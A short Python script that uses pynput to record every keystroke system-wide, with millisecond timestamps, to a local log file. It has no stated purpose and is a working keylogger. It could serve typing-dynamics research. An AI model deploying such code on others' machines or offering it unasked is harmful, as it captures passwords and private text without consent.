from pynput.keyboard import Listener
import logging
import time

log_dir = ""

logging.basicConfig(filename=(log_dir + "logfile.txt"), level=logging.DEBUG, format='%(message)s')


def on_press(key):
    logging.info(str(int(round(time.time() * 1000))) + " " + str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
